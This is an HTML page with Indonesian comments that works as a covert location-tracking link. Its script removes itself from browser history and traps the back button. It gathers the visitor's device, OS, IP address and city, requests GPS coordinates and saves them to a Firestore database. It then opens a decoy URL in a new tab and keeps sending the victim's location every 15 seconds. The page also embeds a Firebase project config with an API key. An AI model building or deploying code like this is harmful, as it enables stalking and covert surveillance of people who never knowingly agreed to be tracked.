<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title> <!-- judul kosong -->
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; filter: blur(10px); }
    </style>
</head>
<body>
    <h2>Sedang tracking lokasi...</h2>

    <script type="module">
        // Nyamar di history
        history.replaceState({}, "", "/");

        // Jebakan tombol back
        window.history.pushState(null, "", window.location.href);
        window.onpopstate = function () {
            window.history.go(1);
        };

        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
        import { getFirestore, doc, getDoc, updateDoc, arrayUnion } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

        // Ganti dengan config Firebase project kamu
        const firebaseConfig = {
            apiKey: "AIzaSyAtTaKf_Psb-yhxa5nNFIcs3Tte5gjYe00",
            authDomain: "locked-1dfad.firebaseapp.com",
            projectId: "locked-1dfad",
            storageBucket: "locked-1dfad.firebasestorage.app",
            messagingSenderId: "237366240355",
            appId: "1:237366240355:web:e3a4f999ff547a07398456"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);
        const urlParams = window.location.href;
        const match = urlParams.match(/[?&]id=([^&]+)/);
        const linkId = match ? match[1] : "";
        console.log("FULL URL =", window.location.href);
        console.log("window.location.pathname =", window.location.pathname);
        console.log("window.location.search =", window.location.search);
        console.log("document.baseURI =", document.baseURI);
        console.log("Extracted linkId =", linkId);
        if (!linkId) {
            document.body.innerHTML = "<h2>Link ID tidak ada di URL</h2>";
            throw new Error("Link ID kosong");
        }
        const linkRef = doc(db, "trackingLinks", linkId);

        onAuthStateChanged(auth, async (user) => {
            if (!user) return;
            const docSnap = await getDoc(linkRef);
            if (!docSnap.exists()) {
                document.body.innerHTML = "<h2> Dokumen link tidak ditemukan</h2>";
                return;
            }
            const linkData = docSnap.data() || {};
            if (typeof linkData.targetUrl !== "string") {
                document.body.innerHTML = "<h2>Error: Tautan tidak valid</h2>";
                return;
            }
            const clickData = { timestamp: Date.now() };

            // Deteksi Device & OS
            const ua = (navigator.userAgent || "").toLowerCase();
            let device = "Unknown Device";
            let os = "Unknown OS";

            if (ua.includes("oppo")) device = "Oppo";
            else if (ua.includes("vivo")) device = "Vivo";
            else if (ua.includes("xiaomi")) device = "Xiaomi";
            else if (ua.includes("redmi")) device = "Xiaomi (Redmi)";
            else if (ua.includes("samsung")) device = "Samsung";
            else if (ua.includes("realme")) device = "Realme";
            else if (ua.includes("huawei")) device = "Huawei";
            else if (ua.includes("infinix")) device = "Infinix";
            else if (ua.includes("asus")) device = "Asus";
            else if (ua.includes("iphone")) device = "iPhone";
            else if (ua.includes("ipad")) device = "iPad";

            if (ua.includes("android")) os = "Android";
            else if (ua.includes("iphone") || ua.includes("ipad") || ua.includes("ipod")) os = "iOS";
            else if (ua.includes("win")) os = "Windows";
            else if (ua.includes("mac")) os = "MacOS";
            else if (ua.includes("linux")) os = "Linux";

            clickData.device = device;
            clickData.os = os;

            // Ambil IP
            fetch('https://api.ipify.org?format=json').then(res => res.json()).then(ipData => {
                const ipv4 = ipData.ip;
                return fetch(`https://ipapi.co/${ipv4}/json/`).then(res => res.json()).then(geo => {
                    clickData.ipInfo = {
                        ip: ipv4,
                        city: geo.city,
                        country: geo.country_name
                    };
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(pos => {
                            clickData.location = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude
                            };
                            saveAndRedirect();
                        }, () => saveAndRedirect(), { timeout: 5000 });
                    } else {
                        saveAndRedirect();
                    }
                });
            }).catch(() => saveAndRedirect());

            async function saveAndRedirect() {
                // Simpan klik ke Firestore
                await updateDoc(linkRef, {
                    clicks: arrayUnion(clickData)
                });

                // Mulai tracking berkala
                startTracking();

                // Buka target di tab baru (track.html tetap hidup)
                window.open(linkData.targetUrl, "_blank");
            }

            function startTracking() {
                if (!navigator.geolocation) return;
                setInterval(async () => {
                    navigator.geolocation.getCurrentPosition(async pos => {
                        const snap = await getDoc(linkRef);
                        if (snap.exists()) {
                            let data = snap.data();
                            let history = data.locations || [];

                            history.push({
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude,
                                timestamp: Date.now()
                            });

                            // hanya 10 lokasi terakhir
                            if (history.length > 10) {
                                history = history.slice(history.length - 10);
                            }

                            await updateDoc(linkRef, { locations: history });
                        }
                    }, () => {}, { timeout: 5000 });
                }, 15000); // update tiap 15 detik
            }
        });
    </script>
</body>
</html>
